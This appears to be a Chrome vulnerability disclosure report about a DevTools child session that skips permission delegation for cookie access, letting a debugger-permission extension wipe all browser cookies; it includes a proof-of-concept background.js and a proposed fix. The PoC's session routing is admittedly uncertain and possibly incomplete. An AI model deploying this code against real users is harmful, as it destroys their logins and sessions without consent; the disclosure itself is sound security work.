# VRP Report: Extension Privilege Escalation via DevTools Auto-Attached Session Cookie Access

## Summary

A Chrome extension with `debugger` permission can escalate its cookie-clearing privileges by routing `Network.clearBrowserCookies` through an auto-attached child session. The `TargetHandler::Session` class unconditionally returns `true` for `MayAccessAllCookies()` instead of delegating to the root client, allowing any extension to atomically delete ALL cookies in the browser profile regardless of its `host_permissions` scope.

## Vulnerability Type

Logic bug — privilege escalation via inconsistent permission delegation in DevTools protocol session handling.

## Affected Component

- `content/browser/devtools/protocol/target_handler.cc:618`
- `content/browser/devtools/protocol/network_handler.cc:2501-2505`

## Root Cause

The `TargetHandler::Session` inner class acts as `DevToolsAgentHostClient` for auto-attached child DevTools sessions. It overrides several permission methods, all of which correctly delegate to the root client:

```cpp
bool MayAttachToURL(const GURL& url, bool is_webui) override {
    return GetRootClient()->MayAttachToURL(url, is_webui);
}
bool IsTrusted() override { return GetRootClient()->IsTrusted(); }
bool MayReadLocalFiles() override { return GetRootClient()->MayReadLocalFiles(); }
bool MayWriteLocalFiles() override { return GetRootClient()->MayWriteLocalFiles(); }
bool AllowUnsafeOperations() override { return GetRootClient()->AllowUnsafeOperations(); }
```

However, `MayAccessAllCookies()` is the exception:

```cpp
bool MayAccessAllCookies() override { return true; }  // Does NOT delegate
```

The extension's own client (`ExtensionDevToolsClientHost`) correctly returns `false` for `MayAccessAllCookies()`. The base class comment explicitly states: "Debugger extension clients should keep the default (false)."

When `Network.clearBrowserCookies` is invoked on a child session:

```cpp
void NetworkHandler::ClearCookies(..., DevToolsAgentHostClient& client, ...) {
  if (client.MayAccessAllCookies()) {
    // Atomically deletes ALL cookies - no domain filtering
    cookie_manager->DeleteCookies(network::mojom::CookieDeletionFilter::New(), ...);
  } else {
    // Per-cookie domain filtering via CanAccessCookie → MayAttachToURL
    cookie_manager->GetAllCookies(...);
  }
}
```

The child session's `MayAccessAllCookies() == true` triggers the unrestricted fast path.

## Exploitation

### Prerequisites
- Chrome extension with `debugger` permission
- Extension has limited `host_permissions` (e.g., `*://*.example.com/*`)

### Minimal Extension Code (background.js)

```javascript
// Step 1: Attach debugger to any tab
chrome.tabs.query({active: true}, ([tab]) => {
  chrome.debugger.attach({tabId: tab.id}, "1.3", () => {
    
    // Step 2: Enable auto-attach to child targets (flatten = true for direct access)
    chrome.debugger.sendCommand(
      {tabId: tab.id},
      "Target.setAutoAttach",
      {autoAttach: true, waitForDebuggerOnStart: false, flatten: true},
      () => {
        // Step 3: Listen for auto-attached targets
        chrome.debugger.onEvent.addListener((source, method, params) => {
          if (method === "Target.attachedToTarget") {
            // Step 4: Send clearBrowserCookies to child session
            // The child session has MayAccessAllCookies() == true
            chrome.debugger.sendCommand(
              {tabId: tab.id},  // Using flattened protocol with sessionId
              "Network.clearBrowserCookies",
              {},  // No parameters needed
              () => {
                console.log("ALL cookies cleared for ALL domains!");
              }
            );
          }
        });
      }
    );
  });
});
```

Note: With the flattened protocol, commands sent to the parent session with a `sessionId` parameter are routed to the child session. The exact mechanism depends on how `chrome.debugger` handles flattened sessions. Alternatively, the extension can use non-flattened mode and route through `Target.sendMessageToTarget`.

### Result
All cookies for every domain in the browser profile are atomically deleted. This includes:
- Authentication cookies for email, banking, social media
- CSRF tokens
- Session identifiers
- Persistent login cookies

The extension's `host_permissions` (which should limit it to `example.com`) are completely bypassed.

## Security Impact

**Medium-High (Privilege Escalation + Destructive)**

1. **Privilege escalation**: Extension bypasses its declared `host_permissions` scope
2. **Destructive**: Atomic deletion of all user cookies (no undo)
3. **User impact**: All browser sessions terminated simultaneously
4. **Silent execution**: After initial debugger attach consent (infobar), no further user interaction
5. **Enterprise risk**: Policy-installed extensions (`--force-installed`) skip the infobar entirely, making this completely silent

The `debugger` permission warning mentions "access web page data," but users do not expect cookie-clearing for domains outside the extension's stated scope.

## Suggested Fix

Replace line 618 in `content/browser/devtools/protocol/target_handler.cc`:

```cpp
// Before (bug):
bool MayAccessAllCookies() override { return true; }

// After (fix):
bool MayAccessAllCookies() override { return GetRootClient()->MayAccessAllCookies(); }
```

This makes `MayAccessAllCookies()` consistent with all other permission methods in the class, and correctly propagates the extension client's `false` return value to child sessions.

## Chrome Version Tested

Chromium source at HEAD (April 2026)

## References

- `content/browser/devtools/protocol/target_handler.cc:618` — Bug location
- `content/browser/devtools/protocol/target_handler.cc:620-636` — Correct delegation pattern for comparison
- `content/browser/devtools/protocol/network_handler.cc:2494-2515` — ClearCookies uses MayAccessAllCookies()
- `chrome/browser/extensions/api/debugger/debugger_api.cc:670-672` — Extension returns false
- `content/public/browser/devtools_agent_host_client.cc:44-47` — "Debugger extension clients should keep the default (false)"
- `content/browser/devtools/devtools_session.h:221,224` — Network and Target domains available to untrusted extension clients
